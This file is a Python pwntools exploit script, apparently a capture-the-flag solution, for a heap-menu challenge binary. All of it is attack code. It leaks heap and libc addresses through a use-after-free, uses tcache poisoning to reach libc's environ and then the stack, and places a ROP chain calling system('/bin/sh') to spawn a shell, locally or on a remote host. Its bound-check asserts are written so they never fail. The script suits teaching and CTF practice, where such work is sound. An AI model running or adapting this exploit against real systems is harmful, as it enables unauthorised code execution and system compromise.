from pwn import *
import sys

BINARY = "pwnme_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p

def num(x: int) -> bytes:
    return str(x).encode()


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def options(self, option):
        p = self.p
        p.sendlineafter(b"> ", option)

    def menu_malloc(self, index: int, how_big: int, payload: bytes):
        p = self.p
        assert index > 0 or index < 99
        self.options(b"1")
        p.sendlineafter(b"which index?\n> ", num(index))
        p.sendlineafter(b"how big?\n> ", num(how_big))
        p.sendlineafter(b"first payload?\n> ", payload)

    def menu_free(self, index: int):
        p = self.p
        assert index > 0 or index < 99
        self.options(b"2")
        p.sendlineafter(b"which index?\n> ", num(index))

    def menu_edit(self, index: int, new_contents: str):
        p = self.p
        assert index > 0 or index < 99
        self.options(b"3")
        p.sendlineafter(b"which index?\n> ", num(index))
        p.sendlineafter(b"New contents?\n> ", new_contents)

    def menu_view(self, index: int):
        p = self.p
        assert index > 0 or index < 99
        self.options(b"4")
        p.sendlineafter(b"which index?\n> ", num(index))
        return p.recvline()

def main():
    x, p = init()
    # allocate unsorted bin chunk for libc leak
    x.menu_malloc(0, 0x420, b"AAAAAAAA")
    
    # allocate tcache size chunk for heap leak
    # this also prevents unsorted bin chunk from coalescing on free
    x.menu_malloc(1, 24, b"BBBBBBBB")
    
    # allocate another 0x20 size chunk for poisoning later
    x.menu_malloc(2, 24, b"CCCCCCCC")
    
    # free 0x20 size chunks into tcache
    # looks like this:
    # [2] -> [1]
    x.menu_free(1)
    x.menu_free(2)
    
    # free unsorted bin size chunk to put libc address
    x.menu_free(0)
    
    # get heap leak
    leak = u64(x.menu_view(1)[:-1].ljust(8, b"\x00"))
    heap = leak << 12
    log.info(f"heap base: 0x{heap:x}")
    
    # get libc leak
    leak = u64(x.menu_view(0)[:-1].ljust(8, b"\x00"))
    libc.address = leak - (libc.sym["main_arena"]+0x60)
    log.info(f"libc base: 0x{libc.address:x}")
    
    # do tcache poisoning
    mask = heap >> 12
    x.menu_edit(2, p64(mask ^ libc.sym['environ']))
    
    # allocate two chunks
    # second chunks will be environ chunk
    x.menu_malloc(2, 0, '')
    x.menu_malloc(2, 0, '')
    
    # get stack leak
    stack = u64(x.menu_view(2)[:-1].ljust(8, b'\x00'))
    log.info(f"stack leak: 0x{stack:x}")
    
    # offset stack leak to return address location
    stack -= 336 + 8
    
    # do poisoning again to get write on stack woohoo im having so much fun
    x.menu_malloc(1, 0x40-8, '')
    x.menu_malloc(2, 0x40-8, '')
    x.menu_free(1)
    x.menu_free(2)
    x.menu_edit(2, p64(mask ^ stack))
    
    def rop(x): return ROP(libc).find_gadget(x)[0]
    
    payload = flat(
        b"A"*8,
        rop(['pop rdi', 'ret']),
        next(libc.search(b"/bin/sh\x00")),
        libc.sym['system'],
    )
    
    x.menu_malloc(2, 0x40-8, b'')
    x.debug("break *main+184")
    x.menu_malloc(2, 0x40-8, payload)
    
    p.interactive()

if __name__ == "__main__":
    main()